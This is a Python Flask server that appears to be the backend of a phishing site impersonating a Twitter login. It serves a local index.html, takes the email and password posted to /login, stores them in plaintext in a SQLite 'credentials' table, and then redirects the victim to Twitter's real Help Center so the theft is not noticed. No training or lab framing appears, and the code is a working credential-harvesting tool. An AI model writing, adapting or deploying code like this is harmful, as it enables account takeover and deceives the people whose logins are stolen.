from flask import Flask, render_template, send_from_directory, request, redirect, abort
import sqlite3
import os

app = Flask(__name__)

# Function to insert credentials into the database
def insert_credentials(email, password):
    try:
        conn = sqlite3.connect('credentials.db')  # Connect to the database
        cursor = conn.cursor()
        cursor.execute("INSERT INTO credentials (email, password) VALUES (?, ?)", (email, password))
        conn.commit()  # Commit the changes
    except sqlite3.Error as e:
        print(f"Database error: {e}")
    finally:
        conn.close()  # Ensure the connection is always closed

# Create the credentials table if it doesn't exist
def create_table():
    try:
        conn = sqlite3.connect('credentials.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS credentials (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            email TEXT NOT NULL,
                            password TEXT NOT NULL);''')
        conn.commit()
    except sqlite3.Error as e:
        print(f"Database error: {e}")
    finally:
        conn.close()

# Home route
@app.route('/')
def index():
    current_dir = os.path.abspath(os.path.dirname(__file__))
    return send_from_directory(current_dir, 'index.html')

# Image route
@app.route('/images/<path:filename>')
def serve_image(filename):
    current_dir = os.path.abspath(os.path.dirname(__file__))
    images_folder = os.path.join(current_dir, 'images')
    image_path = os.path.join(images_folder, filename)
    if os.path.exists(image_path) and os.path.isfile(image_path):
        return send_from_directory(images_folder, filename)
    return abort(404)

# Login route (POST request to handle login)
@app.route('/login', methods=['POST'])
def login():
    try:
        # Check if the email and password are provided in the form
        if 'email' in request.form and 'password' in request.form:
            email = request.form['email']
            password = request.form['password']
        
            # Insert credentials into the database
            insert_credentials(email, password)
        
            # Redirect to the Twitter Help Center after form submission
            return redirect("https://help.twitter.com/")
        
        return "Invalid form submission: Missing email or password."

    except Exception as e:
        print(f"Error in login route: {e}")
        return "An error occurred while processing the login request."


if __name__ == '__main__':
    # Create the database table if it doesn't exist
    create_table()

    # Run the Flask app
    app.run(host='0.0.0.0', port=10000, debug=True)  # DEBUG MUST BE FALSE FOR PRODUCTION!



